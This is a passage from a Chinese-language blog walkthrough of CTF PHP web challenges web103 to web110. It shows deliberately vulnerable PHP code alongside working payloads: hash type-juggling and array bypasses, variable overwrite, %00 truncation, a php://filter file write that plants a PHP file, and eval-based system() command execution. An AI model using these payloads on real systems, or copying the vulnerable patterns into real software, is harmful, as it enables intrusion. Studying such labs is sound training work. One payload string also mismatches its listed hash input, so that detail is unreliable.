$v4 = is_numeric($v2) and is_numeric($v3);
if($v4)&amp;#123;
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    if(!preg_match(&amp;quot;/.*p.*h.*p.*/i&amp;quot;,$str))&amp;#123;
        file_put_contents($v3,$str);
    &amp;#125;
    else&amp;#123;
        die(&amp;#39;Sorry&amp;#39;);
    &amp;#125;
&amp;#125;
else&amp;#123;
    die(&amp;#39;hacker&amp;#39;);
&amp;#125;

?&amp;gt;

Notice: Undefined index: v1 in /var/www/html/index.php on line 14

Notice: Undefined index: v2 in /var/www/html/index.php on line 15

Notice: Undefined index: v3 in /var/www/html/index.php on line 16
hacker
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;preg_match(&amp;quot;/.*p.*h.*p.*/i&amp;quot;,$str)&lt;/code&gt;判断字符串 &lt;code&gt;$str&lt;/code&gt; 中是否包含一个顺序为 &lt;code&gt;p&lt;/code&gt; → &lt;code&gt;h&lt;/code&gt; → &lt;code&gt;p&lt;/code&gt; 的字符序列，中间可以插入任意字符，且大小写不敏感&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;题解同web102&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;payload&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
?v2=00504438395948526859794171594473&amp;amp;v3=php://filter/write=convert.base64-decode/resource=1.php

#POST
v1=hex2bin
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;访问 &lt;code&gt;靶机/1.php&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250807144521986.png&#34; alt=&#34;image-20250807144521986&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web104&#34;&gt;&lt;a href=&#34;#web104&#34; class=&#34;headerlink&#34; title=&#34;web104&#34;&gt;&lt;/a&gt;web104&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: atao
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-28 22:27:20

*/


highlight_file(__FILE__);
include(&amp;quot;flag.php&amp;quot;);

if(isset($_POST[&amp;#39;v1&amp;#39;]) &amp;amp;&amp;amp; isset($_GET[&amp;#39;v2&amp;#39;]))&amp;#123;
    $v1 = $_POST[&amp;#39;v1&amp;#39;];
    $v2 = $_GET[&amp;#39;v2&amp;#39;];
    if(sha1($v1)==sha1($v2))&amp;#123;
        echo $flag;
    &amp;#125;
&amp;#125;



?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;仔细看题，&lt;code&gt;if&lt;/code&gt; 条件要求的是 &lt;code&gt;sha1&lt;/code&gt; 处理后相同的，所以传入相同的即可&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;payload&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
v2=1

#POST
v1=1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;此外&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;sha1函数无法处理数组类型，会返回NULL&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;因此有另解&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET:
v2[]=1   

#POST: 
v1[]=2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250807145326880.png&#34; alt=&#34;image-20250807145326880&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250807144946462.png&#34; alt=&#34;image-20250807144946462&#34; style=&#34;zoom:33%;&#34; /&gt;



&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web104-1&#34;&gt;&lt;a href=&#34;#web104-1&#34; class=&#34;headerlink&#34; title=&#34;web104&#34;&gt;&lt;/a&gt;web104&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: atao
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-28 22:27:20

*/


highlight_file(__FILE__);
include(&amp;quot;flag.php&amp;quot;);

if(isset($_POST[&amp;#39;v1&amp;#39;]) &amp;amp;&amp;amp; isset($_GET[&amp;#39;v2&amp;#39;]))&amp;#123;
    $v1 = $_POST[&amp;#39;v1&amp;#39;];
    $v2 = $_GET[&amp;#39;v2&amp;#39;];
    if(sha1($v1)==sha1($v2))&amp;#123;
        echo $flag;
    &amp;#125;
&amp;#125;



?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;要求 &lt;code&gt;v1&lt;/code&gt; 和 &lt;code&gt;v2&lt;/code&gt; 经 &lt;code&gt;sha1&lt;/code&gt; 处理后相同，所以传入相同即可&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;payload&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
?v2=1

#POST
v1=1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;或者可以传入数组&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
?v2[]=

#POST
v1[]=
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250807225904735.png&#34; alt=&#34;image-20250807225904735&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web105&#34;&gt;&lt;a href=&#34;#web105&#34; class=&#34;headerlink&#34; title=&#34;web105&#34;&gt;&lt;/a&gt;web105&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-28 22:34:07

*/

highlight_file(__FILE__);
include(&amp;#39;flag.php&amp;#39;);
error_reporting(0);
$error=&amp;#39;你还想要flag嘛？&amp;#39;;
$suces=&amp;#39;既然你想要那给你吧！&amp;#39;;
foreach($_GET as $key =&amp;gt; $value)&amp;#123;
    if($key===&amp;#39;error&amp;#39;)&amp;#123;
        die(&amp;quot;what are you doing?!&amp;quot;);
    &amp;#125;
    $$key=$$value;
&amp;#125;foreach($_POST as $key =&amp;gt; $value)&amp;#123;
    if($value===&amp;#39;flag&amp;#39;)&amp;#123;
        die(&amp;quot;what are you doing?!&amp;quot;);
    &amp;#125;
    $$key=$$value;
&amp;#125;
if(!($_POST[&amp;#39;flag&amp;#39;]==$flag))&amp;#123;
    die($error);
&amp;#125;
echo &amp;quot;your are good&amp;quot;.$flag.&amp;quot;\n&amp;quot;;
die($suces);

?&amp;gt;
你还想要flag嘛？
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;可知，可由 &lt;code&gt;die($error)&lt;/code&gt; 或者 &lt;code&gt;die($suces)&lt;/code&gt; 输出 flag&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;$$a=$$b&lt;/code&gt; 为变量覆盖&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;若由 &lt;code&gt;die($error)&lt;/code&gt; 输出 flag，则要求 &lt;code&gt;$flag&lt;/code&gt; 不为 &lt;code&gt;flag&lt;/code&gt; 且 &lt;code&gt;$error=flag&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;但受 &lt;code&gt;foreach&lt;/code&gt; 限制，若 &lt;code&gt;error&lt;/code&gt; 以 &lt;code&gt;GET&lt;/code&gt; 方式获取，无法得到 flag&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;故以 &lt;code&gt;POST&lt;/code&gt; 方式传递，且 &lt;code&gt;error&lt;/code&gt; 不为 &lt;code&gt;flag&lt;/code&gt;，再结合 &lt;code&gt;$$key=$$value&lt;/code&gt; 得到payload&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
?love=flag

#POST
error=love
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250807235834481.png&#34; alt=&#34;image-20250807235834481&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;若由 &lt;code&gt;die($suces)&lt;/code&gt; 输出 flag&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?suces=flag&amp;amp;flag=1
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;$key = &amp;#39;flag&amp;#39;&lt;/code&gt;，&lt;code&gt;$value = &amp;#39;1&amp;#39;&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;→ 执行：&lt;code&gt;$flag = $1&lt;/code&gt;&lt;ul&gt;
&lt;li&gt;这里是关键！PHP 中 &lt;code&gt;$1&lt;/code&gt; 是未定义的 → &lt;code&gt;null&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;所以此句会让 &lt;code&gt;$flag = null&lt;/code&gt;，&lt;strong&gt;覆盖掉了真正的 flag！(if 条件不成立，绕过）&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250807235334384.png&#34; alt=&#34;image-20250807235334384&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web106&#34;&gt;&lt;a href=&#34;#web106&#34; class=&#34;headerlink&#34; title=&#34;web106&#34;&gt;&lt;/a&gt;web106&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: atao
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-28 22:38:27

*/


highlight_file(__FILE__);
include(&amp;quot;flag.php&amp;quot;);

if(isset($_POST[&amp;#39;v1&amp;#39;]) &amp;amp;&amp;amp; isset($_GET[&amp;#39;v2&amp;#39;]))&amp;#123;
    $v1 = $_POST[&amp;#39;v1&amp;#39;];
    $v2 = $_GET[&amp;#39;v2&amp;#39;];
    if(sha1($v1)==sha1($v2) &amp;amp;&amp;amp; $v1!=$v2)&amp;#123;
        echo $flag;
    &amp;#125;
&amp;#125;



?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;sha1加密后以0e开头字符串&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;aaroZmOk      0e66507019969427134894567494305185566735
aaK1STfY      0e76658526655756207688271159624026011393
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;payload&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
?v2=aaroZmOk

#POST
v1=aaK1STfy
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250808093217749.png&#34; alt=&#34;image-20250808093217749&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用数组绕过，赋不同的值&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
v2[]=2

#POST
v1[]=1
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250808093516691.png&#34; alt=&#34;image-20250808093516691&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web107&#34;&gt;&lt;a href=&#34;#web107&#34; class=&#34;headerlink&#34; title=&#34;web107&#34;&gt;&lt;/a&gt;web107&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-28 23:24:14

*/


highlight_file(__FILE__);
error_reporting(0);
include(&amp;quot;flag.php&amp;quot;);

if(isset($_POST[&amp;#39;v1&amp;#39;]))&amp;#123;
    $v1 = $_POST[&amp;#39;v1&amp;#39;];
    $v3 = $_GET[&amp;#39;v3&amp;#39;];
       parse_str($v1,$v2);
       if($v2[&amp;#39;flag&amp;#39;]==md5($v3))&amp;#123;
           echo $flag;
       &amp;#125;

&amp;#125;



?&amp;gt;php
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;parse_str&lt;/code&gt; 语法&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;parse_str(string $string, array &amp;amp;$result)
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;$string&lt;/strong&gt;：要解析的字符串，通常是 URL 的查询部分，例如 &lt;code&gt;&amp;quot;a=1&amp;amp;b=2&amp;quot;&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;$result&lt;/strong&gt;：一个数组，解析结果会放进这个数组（注意是引用传递，所以用 &lt;code&gt;&amp;amp;&lt;/code&gt;）。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;例子&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;$str = &amp;quot;name=algozzi&amp;amp;age=20&amp;quot;;
parse_str($str, $output);

print_r($output);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;输出：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;Array
(
    [name] =&amp;gt; algozzi
    [age] =&amp;gt; 20
)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;v3&lt;/code&gt; 传入经md5处理后以 &lt;code&gt;0e&lt;/code&gt; 开头的字符串&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;v1&lt;/code&gt; 传入以 &lt;code&gt;0e&lt;/code&gt; 开头的字符串即可&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;payload&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
?v3=QLTHNDT

#POST
v1=flag=0e123
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250808100904512.png&#34; alt=&#34;image-20250808100904512&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web108&#34;&gt;&lt;a href=&#34;#web108&#34; class=&#34;headerlink&#34; title=&#34;web108&#34;&gt;&lt;/a&gt;web108&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-28 23:53:55

*/


highlight_file(__FILE__);
error_reporting(0);
include(&amp;quot;flag.php&amp;quot;);

if (ereg (&amp;quot;^[a-zA-Z]+$&amp;quot;, $_GET[&amp;#39;c&amp;#39;])===FALSE)  &amp;#123;
    die(&amp;#39;error&amp;#39;);

&amp;#125;
//只有36d的人才能看到flag
if(intval(strrev($_GET[&amp;#39;c&amp;#39;]))==0x36d)&amp;#123;
    echo $flag;
&amp;#125;

?&amp;gt;
error
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;整个字符串必须由英文字母组成，而且至少一个字母&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;ereg()&lt;/code&gt; 函数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;它是 &lt;strong&gt;PHP 早期（PHP 7 以前）&lt;/strong&gt; 用来做 &lt;strong&gt;正则匹配&lt;/strong&gt; 的函数。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;语法：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;ereg ( string $pattern , string $string )
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;作用：检查 &lt;code&gt;$string&lt;/code&gt; 里 &lt;strong&gt;是否匹配&lt;/strong&gt; &lt;code&gt;$pattern&lt;/code&gt; 这个正则模式。&lt;/li&gt;
&lt;li&gt;返回值：&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;true&lt;/code&gt;&lt;/strong&gt; → 找到了匹配的内容&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;false&lt;/code&gt;&lt;/strong&gt; → 没有匹配到&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;%00&lt;/code&gt; 可以截断 &lt;code&gt;ereg()&lt;/code&gt; 函数的搜索，正则表达式只会匹配 &lt;code&gt;%00&lt;/code&gt; 之前的内容&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;0x36d&lt;/code&gt; 转成十进制为 &lt;code&gt;877&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;payload&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?c=love%00778
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250808123211733.png&#34; alt=&#34;image-20250808123211733&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web109&#34;&gt;&lt;a href=&#34;#web109&#34; class=&#34;headerlink&#34; title=&#34;web109&#34;&gt;&lt;/a&gt;web109&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-29 22:02:34

*/


highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET[&amp;#39;v1&amp;#39;]) &amp;amp;&amp;amp; isset($_GET[&amp;#39;v2&amp;#39;]))&amp;#123;
    $v1 = $_GET[&amp;#39;v1&amp;#39;];
    $v2 = $_GET[&amp;#39;v2&amp;#39;];

    if(preg_match(&amp;#39;/[a-zA-Z]+/&amp;#39;, $v1) &amp;amp;&amp;amp; preg_match(&amp;#39;/[a-zA-Z]+/&amp;#39;, $v2))&amp;#123;
            eval(&amp;quot;echo new $v1($v2());&amp;quot;);
    &amp;#125;

&amp;#125;

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;要求传入两个都含有字母的参数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;__toString()&lt;/code&gt;&lt;/strong&gt; &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;是 &lt;strong&gt;PHP的魔术方法&lt;/strong&gt;（特殊函数）。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;当一个对象被当作 &lt;strong&gt;字符串&lt;/strong&gt; 使用时，就会自动调用这个方法。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;比如：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;class Test &amp;#123;
    public function __toString() &amp;#123;
        return &amp;quot;字符串&amp;quot;;
    &amp;#125;
&amp;#125;

$t = new Test();
echo $t; // 自动调用 __toString()，输出 &amp;quot;字符串&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;也就是说：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;echo $obj;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&amp;#96;&amp;#96;print($obj);&amp;#96;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;&amp;quot;$obj&amp;quot;&lt;/code&gt;（放在字符串里）&lt;/p&gt;
&lt;p&gt;都会触发 &lt;code&gt;__toString()&lt;/code&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;Exception&lt;/code&gt; 结合异常处理&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;PHP 的 &lt;code&gt;Exception&lt;/code&gt; 类内部就实现了 &lt;code&gt;__toString()&lt;/code&gt;，这样当你直接 &lt;code&gt;echo $e&lt;/code&gt;（一个异常对象）时，PHP 会自动把异常信息转成字符串输出。&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;try &amp;#123;
    throw new Exception(&amp;quot;出错啦&amp;quot;);
&amp;#125; catch (Exception $e) &amp;#123;
    echo $e; // 会触发 Exception 类里的 __toString()
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;ReflectionClass&lt;/code&gt; &amp;#x2F; &lt;code&gt;ReflectionMethod&lt;/code&gt;（反射类）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;反射（Reflection）是 &lt;strong&gt;在运行时分析类、方法、属性信息的能力&lt;/strong&gt;，就像“照镜子看到自己”。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;ReflectionClass&lt;/strong&gt;：用于获取类的信息&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;class Foo &amp;#123;
    public $x;
    public function bar() &amp;#123;&amp;#125;
&amp;#125;

$ref = new ReflectionClass(&amp;#39;Foo&amp;#39;);
print_r($ref-&amp;gt;getMethods()); // 获取所有方法
print_r($ref-&amp;gt;getProperties()); // 获取所有属性
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;ReflectionMethod&lt;/strong&gt;：用于获取具体方法的信息 &lt;strong&gt;ReflectionMethod&lt;/strong&gt;：用于获取具体方法的信息&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$method = new ReflectionMethod(&amp;#39;Foo&amp;#39;, &amp;#39;bar&amp;#39;);
echo $method-&amp;gt;getName(); // 输出 bar
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;用途：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;运行时分析类的结构&lt;/li&gt;
&lt;li&gt;自动调用方法（如 &lt;code&gt;invoke&lt;/code&gt;）&lt;/li&gt;
&lt;li&gt;反序列化、自动加载、代码分析等安全题里很常见&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;利用php内置类让v1不进行报错，v2执行命令&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?v1=ReflectionClass&amp;amp;v2=system(&amp;quot;ls&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250808160423301.png&#34; alt=&#34;image-20250808160423301&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?v1=ReflectionClass&amp;amp;v2=system(&amp;quot;tac fl36dg.txt&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250808160519346.png&#34; alt=&#34;image-20250808160519346&#34; style=&#34;zoom: 25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web110&#34;&gt;&lt;a href=&#34;#web110&#34; class=&#34;headerlink&#34; title=&#34;web110&#34;&gt;&lt;/a&gt;web110&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-29 22:49:10

*/


highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET[&amp;#39;v1&amp;#39;]) &amp;amp;&amp;amp; isset($_GET[&amp;#39;v2&amp;#39;]))&amp;#123;
    $v1 = $_GET[&amp;#39;v1&amp;#39;];
    $v2 = $_GET[&amp;#39;v2&amp;#39;];

    if(preg_match(&amp;#39;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;amp;|\*|\(|\)|\_|\-|\+|\=|\&amp;#123;|\[|\;|\:|\&amp;quot;|\&amp;#39;|\,|\.|\?|\\\\|\/|[0-9]/&amp;#39;, $v1))&amp;#123;
            die(&amp;quot;error v1&amp;quot;);
    &amp;#125;
    if(preg_match(&amp;#39;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;amp;|\*|\(|\)|\_|\-|\+|\=|\&amp;#123;|\[|\;|\:|\&amp;quot;|\&amp;#39;|\,|\.|\?|\\\\|\/|[0-9]/&amp;#39;, $v2))&amp;#123;
            die(&amp;quot;error v2&amp;quot;);
    &amp;#125;

    eval(&amp;quot;echo new $v1($v2());&amp;quot;);

&amp;#125;

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt; &lt;strong&gt;&lt;code&gt;FilesystemIterator&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;类型&lt;/strong&gt;：SPL（Standard PHP Library）里的一个 &lt;strong&gt;迭代器类&lt;/strong&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;作用&lt;/strong&gt;：遍历文件系统（文件夹、文件）。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;语法&lt;/strong&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;$it = new FilesystemIterator(&amp;#39;.&amp;#39;);
foreach ($it as $file) &amp;#123;
    echo $file-&amp;gt;getFilename() . &amp;quot;\n&amp;quot;;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;特点&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;支持一次性获取很多文件信息（大小、修改时间等）。&lt;/li&gt;
